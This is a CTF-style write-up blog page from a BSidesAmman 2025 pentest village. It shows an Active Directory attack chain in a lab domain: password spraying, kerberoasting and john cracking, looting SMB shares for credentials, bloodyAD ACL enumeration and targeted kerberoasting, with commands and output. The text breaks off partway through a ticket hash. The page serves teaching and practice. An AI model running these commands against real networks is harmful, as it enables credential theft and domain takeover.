<!DOCTYPE html>
<html lang="en-US">
  <head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">

<!-- Begin Jekyll SEO tag v2.8.0 -->
<title>BSidesAmman Writeup EN</title>
<meta name="generator" content="Jekyll v3.10.0" />
<meta property="og:title" content="BSidesAmman Writeup EN" />
<meta name="author" content="Zavier Lee & Saif 'Sawyer' Yaseen" />
<meta property="og:locale" content="en_US" />
<link rel="canonical" href="http://localhost:4000/BSidesAmman-2025-Writeup.html" />
<meta property="og:url" content="http://localhost:4000/BSidesAmman-2025-Writeup.html" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2025-05-26T00:00:00+03:00" />
<meta name="twitter:card" content="summary" />
<meta property="twitter:title" content="BSidesAmman Writeup EN" />
<script type="application/ld+json">
{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"Zavier Lee & Saif 'Sawyer' Yaseen"},"dateModified":"2025-05-26T00:00:00+03:00","datePublished":"2025-05-26T00:00:00+03:00","headline":"BSidesAmman Writeup EN","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/BSidesAmman-2025-Writeup.html"},"publisher":{"@type":"Organization","logo":{"@type":"ImageObject","url":"http://localhost:4000/assets/img/logo.png"},"name":"Zavier Lee & Saif 'Sawyer' Yaseen"},"url":"http://localhost:4000/BSidesAmman-2025-Writeup.html"}</script>
<!-- End Jekyll SEO tag -->

    <link rel="stylesheet" href="/assets/css/style.css?v=a83b2eb57da1c160101b9bde6c8af91f4004368e">
    <!--[if lt IE 9]>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/html5shiv/3.7.3/html5shiv.min.js"></script>
    <![endif]-->
    <!-- start custom head snippets, customize with your own _includes/head-custom.html file -->

<!-- Setup Google Analytics -->



<!-- You can set your favicon here -->
<!-- link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" -->

<!-- end custom head snippets -->

  </head>
  <body>
    <div class="wrapper">
      <header>
        <h1><a href="http://localhost:4000/"> </a></h1>

        
          <img src="/assets/img/logo.png" alt="Logo" />
        

        <p> </p>

        
        <p class="view"><a href="https://github.com/ASYNC-Security/async-security.github.io">View the Project on GitHub <small>ASYNC-Security/async-security.github.io</small></a></p>
        

        

        
      </header>
      <section>

      <style>
    .author-section {
        padding: 14px;
        margin: 16px 0;
        background: rgba(255, 255, 255, 0.02);
        border: 1px solid #444;
        border-radius: 6px;
        position: relative;
    }

    .author-label {
        position: absolute;
        top: -8px;
        left: 12px;
        background: #1a1a1a;
        color: #4da6ff;
        font-size: 0.75em;
        font-weight: 600;
        text-transform: uppercase;
        letter-spacing: 0.5px;
        padding: 0 6px;
    }

    .author-info {
        display: flex;
        align-items: center;
        gap: 12px;
    }

    .author-avatar {
        width: 40px;
        height: 40px;
        border-radius: 50%;
        object-fit: cover;
        box-shadow: 0 2px 6px rgba(77, 166, 255, 0.2);
    }

    .author-details {
        flex: 1;
    }

    .author-name {
        font-weight: 600;
        color: white;
        margin: 0 0 2px 0;
        font-size: 0.95em;
    }

    .author-title {
        color: #ccc;
        font-size: 0.8em;
        margin: 0 0 6px 0;
        font-style: italic;
    }

    .author-links {
        display: flex;
        gap: 8px;
    }

    .social-link {
        display: flex;
        align-items: center;
        justify-content: center;
        width: 28px;
        height: 28px;
        background: #333;
        border-radius: 50%;
        color: #ccc;
        text-decoration: none;
        transition: all 0.3s ease;
        border: 1px solid #444;
        font-size: 0.7em;
    }

    .social-link:hover {
        color: #fff;
        transform: translateY(-1px);
        box-shadow: 0 4px 10px rgba(77, 166, 255, 0.3);
    }

    .post-meta {
        color: #ccc;
        font-size: 0.9em;
        margin-bottom: 12px;
    }

    .toc-container {
        margin: 24px 0;
        background: rgba(255, 255, 255, 0.02);
        border: 1px solid #444;
        border-radius: 6px;
        overflow: hidden;
    }

    .toc-toggle {
        background: none;
        border: none;
        font-size: 1em;
        font-weight: 500;
        cursor: pointer;
        width: 100%;
        text-align: left;
        padding: 16px;
        color: #fff;
        display: flex;
        justify-content: space-between;
        align-items: center;
        transition: background-color 0.2s ease;
    }

    .toc-toggle:hover {
        background: rgba(255, 255, 255, 0.05);
    }

    .toc-toggle::after {
        content: '▼';
        color: #999;
        transition: transform 0.3s ease;
        font-size: 0.8em;
    }

    .toc-toggle.expanded::after {
        transform: rotate(180deg);
    }

    .toc-content {
        display: none;
        padding: 0 16px 16px 16px;
        border-top: 1px solid #333;
        background: rgba(0, 0, 0, 0.1);
    }

    .toc-content.expanded {
        display: block;
        animation: slideDown 0.3s ease-out;
    }

    @keyframes slideDown {
        from {
            opacity: 0;
            transform: translateY(-10px);
        }

        to {
            opacity: 1;
            transform: translateY(0);
        }
    }

    .toc-container a {
        color: #ccc;
        text-decoration: none;
        transition: color 0.2s ease;
    }

    .toc-container a:hover {
        color: #4da6ff;
        text-decoration: underline;
    }

    .toc-container ol {
        margin: 8px 0 0 0;
        padding-left: 20px;
        color: #ccc;
    }

    .toc-container ul {
        margin: 4px 0;
        padding-left: 20px;
        color: #ccc;
    }

    .toc-container li {
        margin: 6px 0;
        line-height: 1.4;
    }

    @media (max-width: 962px) {
        .toc-container {
            margin: 16px 0;
        }

        .toc-toggle {
            padding: 12px;
            font-size: 0.95em;
        }

        .toc-content {
            padding: 0 12px 12px 12px;
        }
    }

    @media (max-width: 962px) {
        .author-section {
            margin: 16px 0;
            padding: 16px;
            border-radius: 6px;
        }

        .author-label {
            top: -8px;
            left: 12px;
            font-size: 0.8em;
        }

        .author-info {
            gap: 12px;
        }

        .author-avatar {
            width: 48px;
            height: 48px;
            border-width: 2px;
        }

        .author-name {
            font-size: 1em;
        }

        .author-title {
            font-size: 0.9em;
        }

        .author-links {
            gap: 12px;
            flex-wrap: wrap;
        }

        .post-meta {
            margin-bottom: 8px;
        }

        h1 {
            margin-top: 0;
            margin-bottom: 10px;
        }

        section {
            padding-top: 0 !important;
        }

        hr {
            display: none;
        }
    }
</style>


<small class="post-meta">26 May 2025</small>





<div class="author-section">
    <div class="author-label">Author</div>
    <div class="author-info">
        
        <img src="./assets/img/authors/zavier.png" alt="Zavier Lee & Saif 'Sawyer' Yaseen" class="author-avatar">
        
        <div class="author-details">
            <div class="author-name">Zavier Lee & Saif 'Sawyer' Yaseen</div>
            
            <div class="author-title">Offensive Security Engineer</div>
            
            
            <div class="author-links">
                
                <a href="https://x.com/gatariee" target="_blank" class="social-link twitter" aria-label="Twitter">
                    <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor"
                        class="bi bi-twitter-x" viewBox="0 0 16 16">
                        <path
                            d="M12.6.75h2.454l-5.36 6.142L16 15.25h-4.937l-3.867-5.07-4.425 5.07H.316l5.733-6.57L0 .75h5.063l3.495 4.633L12.601.75Zm-.86 13.028h1.36L4.323 2.145H2.865z" />
                    </svg></a>
                
                
                <a href="https://github.com/gatariee" target="_blank" class="social-link github" aria-label="GitHub"> <svg
                        width="24" height="24" viewBox="0 0 24 24" fill="currentColor">
                        <path
                            d="M12 0c-6.626 0-12 5.373-12 12 0 5.302 3.438 9.8 8.207 11.387.599.111.793-.261.793-.577v-2.234c-3.338.726-4.033-1.416-4.033-1.416-.546-1.387-1.333-1.756-1.333-1.756-1.089-.745.083-.729.083-.729 1.205.084 1.839 1.237 1.839 1.237 1.07 1.834 2.807 1.304 3.492.997.107-.775.418-1.305.762-1.604-2.665-.305-5.467-1.334-5.467-5.931 0-1.311.469-2.381 1.236-3.221-.124-.303-.535-1.524.117-3.176 0 0 1.008-.322 3.301 1.23.957-.266 1.983-.399 3.003-.404 1.02.005 2.047.138 3.006.404 2.291-1.552 3.297-1.23 3.297-1.23.653 1.653.242 2.874.118 3.176.77.84 1.235 1.911 1.235 3.221 0 4.609-2.807 5.624-5.479 5.921.43.372.823 1.102.823 2.222v3.293c0 .319.192.694.801.576 4.765-1.589 8.199-6.086 8.199-11.386 0-6.627-5.373-12-12-12z" />
                    </svg></a>
                
            </div>
            
        </div>
    </div>
</div>


<h1 id="bsidesamman-writeup-en">BSidesAmman Writeup EN</h1>

<p>This is a writeup of the PT Village that we organized during the <a href="https://bsidesamman.io/">BSidesAmman Conference</a> in Amman, Jordan.</p>

<div class="toc-container">
<button class="toc-toggle" onclick="toggleToc()">Table of Contents</button>
<div class="toc-content" id="tocContent">
<ol>
<li>
<a href="#introduction">Introduction</a>
<ul>
<li><a href="#disclaimer-and-scenario">disclaimer and scenario</a></li>
<li><a href="#required-tools">required tools</a></li>
</ul>
</li>

<li>
<a href="#initial-access">Initial access</a>
<ul>
<li><a href="#credential-discovery">credential discovery</a></li>
</ul>
</li>

<li>
<a href="#accessing-svc_web">Accessing svc_web</a>
<ul>
<li><a href="#smb-share-enumeration">smb share enumeration</a></li>
</ul>
</li>

<li>
<a href="#authenticating-as-abdullah-azooz">Authenticating as abdullah.azooz</a>
<ul>
<li><a href="#acl-enumeration-with-bloodyad">acl enumeration with bloodyAD</a></li>
</ul>
</li>

<li>
<a href="#mustafa-options">Mustafa options</a>
<ul>
<li><a href="#targetted-kerberoasting">targetted kerberoasting</a></li>
<li><a href="#shadow-credentials-attack">shadow credentials attack</a></li>
<li><a href="#group-enumeration">group enumeration</a></li>
</ul>
</li>

<li>
<a href="#dcsync">DCSync</a>
<ul>
<li><a href="#transferring-the-files">transferring the files</a></li>
<li><a href="#dcsync-with-machine-account">dcsync with machine account</a></li>
</ul>
</li>
</ol>

</div>
</div>
<p><br /></p>

<h2 id="introduction">Introduction</h2>

<h3 id="disclaimer-and-scenario">Disclaimer and Scenario</h3>

<h4 id="original-assumed-breach-scenario">Original Assumed breach Scenario</h4>

<p>the following credentials were given as part of an assumed breach for the internal assessment:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>hasan.bakri@albalad.bsides.rv  
ILoveJordan123@  
</code></pre></div></div>

<h4 id="updated-scenario">Updated Scenario</h4>

<p>In this version the initial access is done by password spraying, the users are given the necessary IPs and the user given a hint if no progress has been made in 5 minutes.<br />
the hint being “Everything you need is provided to you, the username and the IPs” so we will be moving forward with the credentials updated scenario credentials <code class="language-plaintext highlighter-rouge">hasan.bakri:hasan.bakri</code></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nxc smb 10.2.10.11 -u 'hasan.bakri' -p 'hasan.bakri'  
</code></pre></div></div>

<h3 id="required-tools">Required Tools</h3>

<p>The following tools will most likely be used during the CTF:</p>
<ol>
  <li><a href="https://www.netexec.wiki/">NetExec</a></li>
  <li><a href="https://github.com/fortra/impacket">Impacket</a></li>
  <li><a href="https://github.com/CravateRouge/bloodyAD">BloodyAD</a></li>
  <li><a href="https://github.com/SpecterOps/BloodHound">BloodHound</a></li>
</ol>

<h3 id="bloodhound-usage">BloodHound Usage</h3>

<blockquote>
  <p>Like previous writeups There is <em>nothing</em> wrong with Bloodhound, But it is always best to understand the limitations of tooling and how to operate without it
Like previous writeups There is <em>nothing</em> wrong with Bloodhound, But it is always best to understand the limitations of tooling</p>
</blockquote>

<p><br /></p>

<h2 id="initial-access">Initial Access</h2>
<p>using the information provided, we can first fingerprint the domain.</p>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">echo</span> <span class="s1">'10.2.10.11'</span> <span class="o">&gt;&gt;</span> targets.txt
<span class="nb">echo</span> <span class="s1">'10.2.10.12'</span> <span class="o">&gt;&gt;</span> targets.txt
</code></pre></div></div>

<h3 id="credential-discovery">Credential Discovery</h3>

<p>The first step is password spraying, using the username as the password. This allows us to authenticate as a user and obtain the hostnames.</p>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nxc smb targets.txt <span class="nt">-u</span> <span class="s1">'hasan.bakri'</span> <span class="nt">-p</span> <span class="s1">'hasan.bakri'</span> <span class="nt">--generate-hosts-file</span> hosts.txt
SMB         10.2.10.11      445    DC01             <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows Server 2022 Build 20348 x64 <span class="o">(</span>name:DC01<span class="o">)</span> <span class="o">(</span>domain:albalad.bsides.rv<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>  
SMB         10.2.10.12      445    DEV03            <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows Server 2022 Build 20348 x64 <span class="o">(</span>name:DEV03<span class="o">)</span> <span class="o">(</span>domain:albalad.bsides.rv<span class="o">)</span> <span class="o">(</span>signing:False<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>  
SMB         10.2.10.11      445    DC01             <span class="o">[</span>+] albalad.bsides.rv<span class="se">\h</span>asan.bakri:hasan.bakri 
SMB         10.2.10.12      445    DEV03            <span class="o">[</span>+] albalad.bsides.rv<span class="se">\h</span>asan.bakri:hasan.bakri
Running nxc against 2 targets ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100% 0:00:00  
<span class="nb">cat </span>hosts.txt
10.2.10.11     DC01.albalad.bsides.rv albalad.bsides.rv DC0110.2.10.12     DEV03.albalad.bsides.rv DEV03
</code></pre></div></div>

<p>we can infer that the domain controller is <code class="language-plaintext highlighter-rouge">DC01.albalad.bsides.rv</code>, however we can confirm this by checking if the <code class="language-plaintext highlighter-rouge">ldap</code> service is enabled.</p>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nxc ldap DC01.albalad.bsides.rv LDAP        10.2.10.11      389    DC01             <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows Server 2022 Build 20348 <span class="o">(</span>name:DC01<span class="o">)</span> <span class="o">(</span>domain:albalad.bsides.rv<span class="o">)</span>  
</code></pre></div></div>

<p>checking the shares on these machines, we identify a <code class="language-plaintext highlighter-rouge">svc_home$</code>.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nxc smb targets.txt -u 'hasan.bakri' -p 'hasan.bakri' --shares
SMB         10.2.10.12      445    DEV03            [*] Windows Server 2022 Build 20348 x64 (name:DEV03) (domain:albalad.bsides.rv) (signing:False) (SMBv1:False) 
SMB         10.2.10.11      445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:albalad.bsides.rv) (signing:True) (SMBv1:False) 
SMB         10.2.10.12      445    DEV03            [+] albalad.bsides.rv\hasan.bakri:hasan.bakri
SMB         10.2.10.11      445    DC01             [+] albalad.bsides.rv\hasan.bakri:hasan.bakri 
SMB         10.2.10.12      445    DEV03            [*] Enumerated shares
SMB         10.2.10.12      445    DEV03            Share           Permissions     Remark
SMB         10.2.10.12      445    DEV03            -----           -----------     ------
SMB         10.2.10.12      445    DEV03            ADMIN$                          Remote Admin
SMB         10.2.10.12      445    DEV03            C$                              Default share
SMB         10.2.10.12      445    DEV03            IPC$            READ            Remote IPC
SMB         10.2.10.12      445    DEV03            svc_home$                       common directory for service accounts
SMB         10.2.10.11      445    DC01             [*] Enumerated shares
SMB         10.2.10.11      445    DC01             Share           Permissions     Remark
SMB         10.2.10.11      445    DC01             -----           -----------     ------
SMB         10.2.10.11      445    DC01             ADMIN$                          Remote Admin
SMB         10.2.10.11      445    DC01             C$                              Default share
SMB         10.2.10.11      445    DC01             IPC$            READ            Remote IPCS
SMB         10.2.10.11      445    DC01             NETLOGON        READ            Logon server share 
SMB         10.2.10.11      445    DC01             SYSVOL          READ            Logon server share
</code></pre></div></div>

<p>we can infer that the <code class="language-plaintext highlighter-rouge">svc_home$</code> share would belongs to service accounts.</p>

<h2 id="gaining-access-to-svc_web">Gaining Access to SVC_WEB</h2>

<p>next, we can identify users with a service principal name (SPN) using the following command. users with an SPN can have their service tickets requested, and cracked offline (known as a <code class="language-plaintext highlighter-rouge">kerberoasting</code> attack.)</p>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>GetUserSPNs.py <span class="s1">'albalad.bsides.rv'</span>/<span class="s1">'hasan.bakri'</span>:<span class="s1">'hasan.bakri'</span>
Impacket v0.13.0.dev0+20250422.104055.27bebb13 - Copyright Fortra, LLC and its affiliated companies   
ServicePrincipalName                   Name     MemberOf                                                 PasswordLastSet             LastLogon  Delegation <span class="nt">-------------------------------------</span>  <span class="nt">-------</span>  <span class="nt">-------------------------------------------------------</span>  <span class="nt">--------------------------</span>  <span class="nt">---------</span>  <span class="nt">----------</span>
HTTP/W-SVR-02.albalad.bsides.rv:80     svc_web  <span class="nv">CN</span><span class="o">=</span>Service Accounts,CN<span class="o">=</span>Users,DC<span class="o">=</span>albalad,DC<span class="o">=</span>bsides,DC<span class="o">=</span>rv  2025-04-28 12:50:15.334591  &lt;never&gt;               
HTTP/W-SVR-01.albalad.bsides.rv:80     svc_web  <span class="nv">CN</span><span class="o">=</span>Service Accounts,CN<span class="o">=</span>Users,DC<span class="o">=</span>albalad,DC<span class="o">=</span>bsides,DC<span class="o">=</span>rv  2025-04-28 12:50:15.334591  &lt;never&gt;               
MSSQLSvc/SQL02.albalad.bsides.rv:1433  svc_sql  <span class="nv">CN</span><span class="o">=</span>Service Accounts,CN<span class="o">=</span>Users,DC<span class="o">=</span>albalad,DC<span class="o">=</span>bsides,DC<span class="o">=</span>rv  2025-04-28 12:50:12.631459  &lt;never&gt;               
MSSQLSvc/SQL01.albalad.bsides.rv:1433  svc_sql  <span class="nv">CN</span><span class="o">=</span>Service Accounts,CN<span class="o">=</span>Users,DC<span class="o">=</span>albalad,DC<span class="o">=</span>bsides,DC<span class="o">=</span>rv  2025-04-28 12:50:12.631459  &lt;never&gt;               
VDI/vdi.albalad.bsides.rv:41440        svc_vdi  <span class="nv">CN</span><span class="o">=</span>Service Accounts,CN<span class="o">=</span>Users,DC<span class="o">=</span>albalad,DC<span class="o">=</span>bsides,DC<span class="o">=</span>rv  2025-04-28 12:50:09.803337  &lt;never&gt;               
TERMSRV/vdi.albalad.bsides.rv:3389     svc_vdi  <span class="nv">CN</span><span class="o">=</span>Service Accounts,CN<span class="o">=</span>Users,DC<span class="o">=</span>albalad,DC<span class="o">=</span>bsides,DC<span class="o">=</span>rv  2025-04-28 12:50:09.803337  &lt;never&gt; 
</code></pre></div></div>

<p>we see that it is slightly odd that none of the service accounts have logged on, but it could be alright if they are only ran as services. all of the users can be kerberoasted, but we will only focus on <code class="language-plaintext highlighter-rouge">svc_web</code> for now.</p>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>GetUserSPNs.py <span class="s1">'albalad.bsides.rv'</span>/<span class="s1">'hasan.bakri'</span>:<span class="s1">'hasan.bakri'</span> <span class="nt">-request-user</span> <span class="s1">'svc_web'</span> <span class="nt">-outputfile</span> <span class="s1">'svc_web.tgs'</span>
Impacket v0.13.0.dev0+20250422.104055.27bebb13 - Copyright Fortra, LLC and its affiliated companies   
ServicePrincipalName                Name     MemberOf                                                 PasswordLastSet             LastLogon  Delegation <span class="nt">----------------------------------</span>  <span class="nt">-------</span>  <span class="nt">-------------------------------------------------------</span>  <span class="nt">--------------------------</span>  <span class="nt">---------</span>  <span class="nt">----------</span>
HTTP/W-SVR-02.albalad.bsides.rv:80  svc_web  <span class="nv">CN</span><span class="o">=</span>Service Accounts,CN<span class="o">=</span>Users,DC<span class="o">=</span>albalad,DC<span class="o">=</span>bsides,DC<span class="o">=</span>rv  2025-04-28 12:50:15.334591  &lt;never&gt;               
HTTP/W-SVR-01.albalad.bsides.rv:80  svc_web  <span class="nv">CN</span><span class="o">=</span>Service Accounts,CN<span class="o">=</span>Users,DC<span class="o">=</span>albalad,DC<span class="o">=</span>bsides,DC<span class="o">=</span>rv  2025-04-28 12:50:15.334591  &lt;never&gt;  
</code></pre></div></div>

<p>this ticket can be cracked offline with <code class="language-plaintext highlighter-rouge">john</code>, or <code class="language-plaintext highlighter-rouge">hashcat</code>.</p>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>john <span class="nt">--wordlist</span><span class="o">=</span>/usr/share/wordlists/rockyou.txt svc_web.tgs 
Using default input encoding: UTF-8Loaded 1 password <span class="nb">hash</span> <span class="o">(</span>krb5tgs, Kerberos 5 TGS etype 23 <span class="o">[</span>MD4 HMAC-MD5 RC4]<span class="o">)</span>  
Will run 4 OpenMP threadsPress <span class="s1">'q'</span> or Ctrl-C to abort, almost any other key <span class="k">for </span>status
webkinz1         <span class="o">(</span>?<span class="o">)</span>     1g 0:00:00:00 DONE <span class="o">(</span>2025-04-28 13:01<span class="o">)</span> 33.33g/s 1126Kp/s 1126Kc/s 1126KC/s dumbo..redcatUse the <span class="s2">"--show"</span> option to display all of the cracked passwords reliably
Session completed.
</code></pre></div></div>

<h3 id="smb-share-enumeration">SMB Share Enumeration</h3>

<p>using the <code class="language-plaintext highlighter-rouge">svc_web</code> account, we can enumerate the shares again and find that we now have access to <code class="language-plaintext highlighter-rouge">svc_home$</code>.</p>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nxc smb DEV03.albalad.bsides.rv <span class="nt">-u</span> <span class="s1">'svc_web'</span> <span class="nt">-p</span> <span class="s1">'webkinz1'</span> <span class="nt">--shares</span>
SMB         10.2.10.12      445    DEV03            <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows Server 2022 Build 20348 x64 <span class="o">(</span>name:DEV03<span class="o">)</span> <span class="o">(</span>domain:albalad.bsides.rv<span class="o">)</span> <span class="o">(</span>signing:False<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span> 
SMB         10.2.10.12      445    DEV03            <span class="o">[</span>+] albalad.bsides.rv<span class="se">\s</span>vc_web:webkinz1 
SMB         10.2.10.12      445    DEV03            <span class="o">[</span><span class="k">*</span><span class="o">]</span> Enumerated shares
SMB         10.2.10.12      445    DEV03            Share           Permissions     Remark
SMB         10.2.10.12      445    DEV03            <span class="nt">-----</span>           <span class="nt">-----------</span>     <span class="nt">------</span>
SMB         10.2.10.12      445    DEV03            ADMIN<span class="nv">$ </span>                         Remote Admin
SMB         10.2.10.12      445    DEV03            C<span class="nv">$ </span>                             Default share
SMB         10.2.10.12      445    DEV03            IPC<span class="nv">$ </span>           READ            Remote IPC
SMB         10.2.10.12      445    DEV03            svc_home<span class="nv">$ </span>      READ,WRITE      common directory <span class="k">for </span>service accounts
</code></pre></div></div>

<p>we can begin looting this share, and find credentials in <code class="language-plaintext highlighter-rouge">\\svc_home$\svc_home$\svc_web\config.php</code></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;?php  
define('DB_HOST', 'localhost');  
define('DB_USER', 'abdullah.azooz');  
define('DB_PASS', 'PetraEnjoyer1950');  
define('DB_NAME', 'web_db');  
?&gt;  
</code></pre></div></div>

<h2 id="authenticating-as-abdullahazooz">Authenticating as Abdullah.Azooz</h2>
<p>we find that these credentials are valid for the domain.</p>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nxc smb dc01.albalad.bsides.rv <span class="nt">-u</span> <span class="s1">'abdullah.azooz'</span> <span class="nt">-p</span> <span class="s1">'PetraEnjoyer1950'</span>
SMB         10.2.10.11      445    DC01             <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows Server 2022 Build 20348 x64 <span class="o">(</span>name:DC01<span class="o">)</span> <span class="o">(</span>domain:albalad.bsides.rv<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span> 
SMB         10.2.10.11      445    DC01             <span class="o">[</span>+] albalad.bsides.rv<span class="se">\a</span>bdullah.azooz:PetraEnjoyer1950
</code></pre></div></div>

<h3 id="bloodyad-enumeration">BloodyAD Enumeration</h3>
<p>We can see that this user has an outbound ACL to mustafa.yaseen</p>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bloodyAD <span class="nt">--host</span> 10.2.10.11 <span class="nt">-d</span> albalad.bsides.rv <span class="nt">-u</span> <span class="s1">'abdullah.azooz'</span>  <span class="nt">-p</span> <span class="s1">'PetraEnjoyer1950'</span> get writable  
distinguishedName: <span class="nv">CN</span><span class="o">=</span>abdullah.azooz,CN<span class="o">=</span>Users,DC<span class="o">=</span>albalad,DC<span class="o">=</span>bsides,DC<span class="o">=</span>rvpermission: WRITE  
distinguishedName: <span class="nv">CN</span><span class="o">=</span>mustafa.yaseen,CN<span class="o">=</span>Users,DC<span class="o">=</span>albalad,DC<span class="o">=</span>bsides,DC<span class="o">=</span>rvpermission: WRITE  
distinguishedName: <span class="nv">CN</span><span class="o">=</span>S-1-5-11,CN<span class="o">=</span>ForeignSecurityPrincipals,DC<span class="o">=</span>albalad,DC<span class="o">=</span>bsides,DC<span class="o">=</span>rvpermission: WRITE
</code></pre></div></div>

<h2 id="two-options-on-mustafayaseen">Two Options On Mustafa.Yaseen</h2>
<p>so we there are multiple attacks vectors since we have genericwrite on a user. them being;</p>

<ul>
  <li>Targeted Kerberoasting</li>
  <li>ShadowCredentials</li>
</ul>

<h3 id="targetted-kerberoasting">Targetted Kerberoasting</h3>
<p>The first option here would be to use targetted kerberoasting. this abuse can be carried out if we have one of the following ACLs over a target, <code class="language-plaintext highlighter-rouge">GenericWrite</code>, <code class="language-plaintext highlighter-rouge">WriteProperty</code>. we can add an SPN (<code class="language-plaintext highlighter-rouge">ServicePrincipalName</code>) to that account. Once the account has an SPN, it becomes vulnerable to <a href="https://www.thehacker.recipes/ad/movement/kerberos/kerberoast">Kerberoasting</a>. This technique is called Targeted Kerberoasting.</p>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>targetedKerberoast.py <span class="nt">-d</span> albalad.bsides.rv <span class="nt">-u</span> abdullah.azooz  <span class="nt">-p</span> <span class="s1">'PetraEnjoyer1950'</span> <span class="nt">--request-user</span> mustafa.yaseen <span class="nt">-o</span> mustafa.txt[<span class="k">*</span><span class="o">]</span> Starting kerberoast attacks  
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Attacking user <span class="o">(</span>mustafa.yaseen<span class="o">)</span>  
<span class="o">[</span>+] Writing <span class="nb">hash </span>to file <span class="k">for</span> <span class="o">(</span>mustafa.yaseen<span class="o">)</span>  
</code></pre></div></div>

<p>now we have accomplished the attack and</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">cat</span> <span class="n">mustafa</span><span class="p">.</span><span class="n">txt</span>  
<span class="err">$</span><span class="n">krb5tgs</span><span class="err">$</span><span class="mi">23</span><span class="err">$</span><span class="o">*</span><span class="n">mustafa</span><span class="p">.</span><span class="n">yaseen</span><span class="err">$</span><span class="n">ALBALAD</span><span class="p">.</span><span class="n">BSIDES</span><span class="p">.</span><span class="n">RV</span><span class="err">$</span><span class="n">albalad</span><span class="p">.</span><span class="n">bsides</span><span class="p">.</span><span class="n">rv</span><span class="o">/</span><span class="n">mustafa</span><span class="p">.</span><span class="n">yaseen</span><span class="o">*</span><span class="err">$</span><span class="n">d3f68ab888e41429dd9c0a33721caa7e</span><span class="err">$</span><span class="n">e069b57e798b66b4c291d5dd9e98cf3e1909b05636450b841eaaa5fb51a8255dc8415118938f4e78424c5d406a60636fa6e7efbdb45b68928b6f53848a4a9530a3e335be2b53d4037b6cdc7e4672d12189cc3ddced2c449a8dcaccb6b8e6d4a4ea2bbb22c082dec9cdc478e0a38ce2f56610cbef7a610f5680c56368fe4140892f27d647eb966cc4b4417cc2bd3efd798e63b2a804bea66609d867668c647d769b97b6158ae8e2e51a659dd2f607b7ca0fc163eca129a34e93f9632bd4861763bc6f6a86dc4f2e44e829acc52ae5583fd90a34f74c07371dbbf3b5445c0a8e3db295b342a36638de367427a8df8f324a73b3a04dbb46b725ac87f84b94acb976ad5e1237c8ed56598a6fc5ba9b89957c75ecea7b5893a7a57438e965b594a1fcbd96910319c1e5fdf0492860141d59151d7ee937a08ecdb12e5c2046832de34c0143167184105212a2e1a02f3539686d9bbb193b1d5da10787070b20cb968c9075321ff02c4a76f184330a0fe98c7b2d9d37509164ed70000f9921313a36bd139f5b660647fada22dd0638ee30176f5067d1242b51bc106daac55ea6139ada5c20a2d06d828596e6403328472a728230b6c73f4bb31a11bd01d2c8df3774c1388c5d6edb47b6412cd46c1af8c30814db73ece3ddeaab5bc47c3ab445bcfb637488e45c11b71bd391537dd2f8b156a7949c3b9a4f5dee7d11b9759c53797fbcaafd67bf4f62f6363c9f52a1cce72cb5df2b43a2755a7e4ff8ef0a78a1dc356dd2c95b35a38890dcaca550bb579a63921d1d0558c5faece1622a0b64cc11522b32a195e6322db86fc1922648db92c1d8d19b66a1bdcf29cd7d75bfb8592e4a502ccafd9e075b37f5dec34ba2400cbb9a0bc583bcdeca81fbcb5f382666ea77bb2e7bbf046254b430213a6a82cb091ee2231aab8d6e454213cf35bbfb4617e7c4c46b089745b1f9812d67beb1883fa132808893c2a0af9774e0ff8e587a7dc26277e37c79660986f39ed700681541b9ff20c13adc970e07e64765fd86e12e80f17e8fbbbd994bc2b8c1801eb3fb01d83066ef1df30b0788d434cb409ddc92031c45fa0aee003ba063f30ff39dee66648a3e048324eb8f22571ceaac3fbe6ffe8b90869f107be104e214a6ccebd0d3a066c5d1d8ecfc883a673a8dbdcea3cfad2d4e8f1ba81265dea4b1ca153e76ade509230977d35a01e6658b7f673290085b180125d3b618b9dce7bb3ddc5c9b00723dee7f36e23c652931915a4fd6a3d073adf994cabc53a4af8d982abc5b1af3f444c5d89c67019735a3d9ae7114a6d4d621a5c739733763f76f30ad0018cf90cd82e04dc497c1221d7380b2596b4719a5a6a4070ac0c5104f08528a8abaf98c172f476bcefd9c6315189febff41d542e144ccd308fef982803ef87e9a7021d8bd7316a9d8dd6ed3e641f4c3b56669aac8e6a6215881a14e9bd6956420be03c352d6fcc2848f79d87